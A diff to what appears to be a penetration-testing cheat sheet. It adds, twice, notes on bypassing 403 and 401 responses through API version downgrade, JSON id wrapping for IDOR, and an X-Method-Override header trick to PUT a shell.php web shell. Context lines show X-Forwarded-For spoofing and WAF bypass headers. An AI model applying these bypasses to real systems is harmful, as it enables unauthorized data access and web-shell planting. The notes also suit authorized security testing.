@@ -265,6 +265,16 @@ payloads
 X-Forwarded-For: 127.0.01
 X-Forwarded-For: 127.0.0.1:80
 https://github.com/yunemse48/403bypasser	=> tool
+
+v3/users_data/1234 --> 403 Forbidden
+/v1/users_data/1234 --> 200 OK
+{“id”:111} --> 401 Unauthriozied
+{“id”:[111]} --> 200 OK
+{“id”:111} --> 401 Unauthriozied
+{“id”:{“id”:111}} --> 200 OK
+PUT /shell.php ==> 403 
+GET /shell.php -H "X-Method-Override: PUT" ==> 200
+
 ------------------------------------------------------------------------------------------------------
 WAF Bypass 
 	  X-Forwarded-Host
@@ -1060,6 +1070,15 @@ IDOR
 10- use Autorize burpsuite 
 
 11-   to make idor try to change requests between PUT => GET => POST and try to change all parameters 
+
+12- v3/users_data/1234 --> 403 Forbidden
+/v1/users_data/1234 --> 200 OK
+{“id”:111} --> 401 Unauthriozied
+{“id”:[111]} --> 200 OK
+{“id”:111} --> 401 Unauthriozied
+{“id”:{“id”:111}} --> 200 OK
+PUT /shell.php ==> 403 
+GET /shell.php -H "X-Method-Override: PUT" ==> 200
 
 ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Jira
